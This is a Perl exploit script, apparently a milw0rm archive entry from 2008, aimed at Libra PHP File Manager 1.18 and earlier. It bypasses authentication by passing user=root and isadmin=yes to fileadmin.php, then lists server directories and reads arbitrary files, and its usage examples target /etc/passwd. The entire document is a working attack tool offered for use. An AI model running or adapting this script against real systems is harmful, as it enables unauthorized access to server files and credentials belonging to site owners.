#! /usr/bin/perl

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
# Libra PHP File Manager <= 1.18 / Local File Inclusion Vulnerability
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

# Program: Libra PHP File Manager
# Version: <= 1.18 , 2.0
# File affected: fileadmin.php
# Download: http://file.sourceforge.net
#
#
# Found by Pepelux <pepelux[at]enye-sec.org>
# eNYe-Sec - www.enye-sec.org
# Greetings to Ka0x for help me with the perl code  :)
#
# You can scale directories and read any file that you have permissions

use LWP::UserAgent;
$ua = LWP::UserAgent->new;

print "\e[2J";
system(($^O eq 'MSWin32') ? 'cls' : 'clear');

my ($host, $path, $action) = @ARGV ;

unless($ARGV[2]) {
	print "Usage: perl $0 <host> <path> <action>\n";
	print "\tex: perl $0 http://site.com /etc/ list\n";
	print "\tex: perl $0 http://site.com /etc/passwd edit\n";
	print "Actions:\n";
	print "   list:\n";
	print "   edit:\n\n";
	exit 1;
}

$ua->agent("$0/0.1 " . $ua->agent);
$host = "http://".$host if ($host !~ /^http:/);
$path = $path."/" if ($action eq "list" && $path !~ /\/$/);
$op = "home" if ($action == "list");

if ($action eq "edit") {
	$aux = $path;
	$directory = "";

	do {
		$x = index($aux, "/");
		$y = length($aux) - $x;
		$directory .= substr($aux, 0, $x+1);
		$aux = substr($aux, $x+1, $y);
	} until ($x == -1);

	$path = $directory;
	$file = $aux;
	$op = "edit";
}

$url = $host."/fileadmin.php?user=root&isadmin=yes&op=".$op."&folder=".$path;
$url .= "&fename=".$file if ($action eq "edit");

$req = HTTP::Request->new(GET => $url);
$req->header('Accept' => 'text/html');

$res = $ua->request($req);

if ($res->is_success) { 
	$result = $res->content;

	if ($action eq "edit") {
		print "Viewing $path$file:\n";
		print $1,"\n" if($result =~ /name="ncontent">(.*)<\/textarea>/s);
	}
	else {
		print "Files in $path:\n";
		$x = index($result, "Files:") + 6;
		$result = substr($result, $x, length($result)-$x);
		$result =~ s/<[^>]*>//g;
		$result =~ s/Filename//g;
		$result =~ s/Size//g;
		$result =~ s/Edit//g;
		$result =~ s/Rename//g;
		$result =~ s/Delete//g;
		$result =~ s/Move//g;
		$result =~ s/View//g;
		$result =~ s/Open//g;
		$result =~ s/\d*//g;
		$result =~ s/\s+/\n/g;
		$x = index($result, "Copyright");
		$result = substr($result, 0, $x);
		print $result;
	}
} 
else { print "Error: " . $res->status_line . "\n";}

# milw0rm.com [2008-09-25]
